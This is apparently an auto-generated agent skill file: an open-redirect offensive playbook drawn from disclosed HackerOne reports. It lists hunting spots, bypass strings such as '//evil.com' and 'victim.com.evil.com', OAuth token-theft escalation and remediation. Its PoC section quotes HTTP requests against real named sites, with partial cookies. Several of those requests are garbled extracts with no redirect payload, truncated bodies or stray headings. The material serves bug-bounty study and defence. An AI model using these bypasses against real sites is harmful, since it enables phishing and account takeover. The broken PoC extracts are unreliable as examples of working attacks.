---
name: open-redirect
description: "Open Redirect offensive playbook from 108 disclosed HackerOne reports (7 high, 39 medium, 62 low). Use when hunting or reviewing open redirect. Triggers: redirect, open, attacker, website, redirection."
license: "For authorized security testing and education only."
---

# Open Redirect

> Distilled from **108** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

A redirect target is taken from user input without validation, enabling phishing, OAuth token theft, and filter-bypass chains.

## Where to hunt

- Find `redirect`, `next`, `returnUrl`, `callback`, `url` params and OAuth `redirect_uri`; test off-site targets.

## Exploitation playbook

- Redirect to attacker site for phishing; steal OAuth `code`/token by redirecting the flow.
- Chain with SSRF/XSS (`javascript:` or `data:` targets) where the sink allows it.

## Bypass techniques

- `//evil.com`, `https:evil.com`, `@` userinfo, whitelisted-substring tricks (`victim.com.evil.com`), encoding, backslashes, CRLF.

## Impact & escalation

- OAuth redirect_uri abuse → account takeover; credential phishing.

## Remediation

- Allowlist redirect targets, use relative paths or mapping keys, exact-match OAuth redirect_uri.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#405697](https://hackerone.com/reports/405697)  -  Open redirection in OAuth
*low*

```http
POST /526915/apps/2544979/install_on_dev_shop HTTP/1.1
Host: partners.shopify.com
Referer: https://partners.shopify.com/526915/apps/2544979
Content-Type: application/x-www-form-urlencoded
Content-Length: 187
Cookie: last_shop=mido-2.myshopify.com; optimizelyEndUserId=oeu1536089316039r0.9037032785131875; _y=…

utf8=%E2%9C%93&authenticity_token=dO84UJSGLnRDTF3yLennlB1esNOx0SxdN0WJSGY8e%2F%2FquALL%2BQSBxb%2ByPgiyxRtoS8aCgQ83x33JxPAmrbHYdA%3D%3D&install_app%5BSelect+a+store%5D=$$.myshopify.com
```

### 2. [#642876](https://hackerone.com/reports/642876)  -  URl redirection
*medium*

```http
POST /register HTTP/1.1
Host: merchant.kartpay.com
Referer: https://merchant.kartpay.com/register
Content-Type: application/x-www-form-urlencoded
Content-Length: 189
Cookie: XSRF-TOKEN=eyJpdiI6IjFKUXdMQlhcL3Z0Ynh1c1dcL3gyeEpiZz09IiwidmFsdWUiOiIya3U5RUlwM0RuMUI5dGpQT…

verification_code=&type=merchant&_token=2zCgjrNgztgRCMhm4cDScrbTARxEmwn4z16Fjnpe&first_name=ahcvcv&last_name=jbshchjs&email=jbcjhsbcbsb%40baxjbj.com&country_code=%2B91&contact_no=9090909090
```

### 3. [#1257753](https://hackerone.com/reports/1257753)  -  Open Redirect on www.redditinc.com via `failed` query param
*medium*

```http
POST /ama HTTP/1.1
Content-Type: multipart/form-data; boundary=----------YWJkMTQzNDcw
Cookie: CRAFT_CSRF_TOKEN=958b77eaad06452d68f0be48c5edf5b0d928b51a6c4afbb5f2f95397f18b43e2a%3A2%3A%7B…
Content-Length: 1508
Host: www.redditinc.com

------------YWJkMTQzNDcw
```

### 4. [#1788006](https://hackerone.com/reports/1788006)  -  Open Redirect in Logout & Login
*medium, $1,000*

```http
GET /?logout=1 HTTP/2
Host: www.expedia.com
Cookie:  { REDACTED }

## Default Response
```

### 5. [#1788006](https://hackerone.com/reports/1788006)  -  Open Redirect in Logout & Login
*medium, $1,000*

```http
GET /?logout=https://qx4lw1nsec.blogspot.com HTTP/2
Host: www.expedia.com
Cookie: { REDACTED }
```

### 6. [#1354255](https://hackerone.com/reports/1354255)  -  Open redirect in fastify-static via mishandled user's input when at…
*low*

```http
GET //google.com/%2e%2e HTTP/1.1
Host: localhost:3000
```

More payloads: see [payloads.md](payloads.md) (28 curated).

## Recurring patterns in this dataset

Most frequent terms across the 108 reports (term (count)): `redirect` (130), `open` (111), `attacker` (24), `website` (24), `redirection` (20), `parameter` (20), `malicious` (19), `url` (19), `discovered` (15), `allowed` (15), `phishing` (13), `attacks` (12), `through` (9), `link` (9), `header` (8), `login` (8), `reported` (8), `domain` (8)

## Worked example  -  [report #904059](https://hackerone.com/reports/904059)

*Open Redirect (6.0.0 < rails < 6.0.3.2)* (high, $1,000)

> Hello, I was looking at the change log (https://github.com/rails/rails/commit/2121b9d20b60ed503aa041ef7b926d331ed79fc2) for CVE-2020-8185 and found another problem existed. https://github.com/rails/rails/blob/v6.0.3.1/actionpack/lib/action dispatch/middleware/actionable exceptions.rb L21 There was an open redirect issue because the request parameter location was not validated. In 6.0.3.2, since the condition of actionable request? has changed, this problem is less likely to occur. PoC 1. Prepare server Prepare an attackable 6.0.3.1 version of Rails server 2. Attack server Prepare the server for attack on another port. 3. Open browser Open the http://localhost:8000/attack.html url in your bro…

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#904059](https://hackerone.com/reports/904059) | high | $1,000 | rails | Open Redirect (6.0.0 < rails < 6.0.3.2) |
| [#665651](https://hackerone.com/reports/665651) | high | $750 | gsa_bbp | Stealing Users OAuth Tokens through redirect_uri parameter |
| [#243474](https://hackerone.com/reports/243474) | high |  -  | inflection | Identity Login Page Redirect Can Be Manipulated |
| [#3588801](https://hackerone.com/reports/3588801) | high |  -  | github | OAuth redirect uri validation bypass for :proxima_first_party_sync apps |
| [#292825](https://hackerone.com/reports/292825) | high |  -  | ed | Possible to redirect to a (non-existing) subdomain after logging in via GitHub (leaking… |
| [#240091](https://hackerone.com/reports/240091) | high |  -  | inflection | Open redirect at app.goodhire.com via ReturnUrl parameter |
| [#384029](https://hackerone.com/reports/384029) | high |  -  | nodejs-ecosystem | url-parse package return wrong hostname |
| [#1865991](https://hackerone.com/reports/1865991) | medium | $2,400 | ibb | Open Redirect Vulnerability in Action Pack |

*See [reference.md](reference.md) for all 108 reports in this class.*
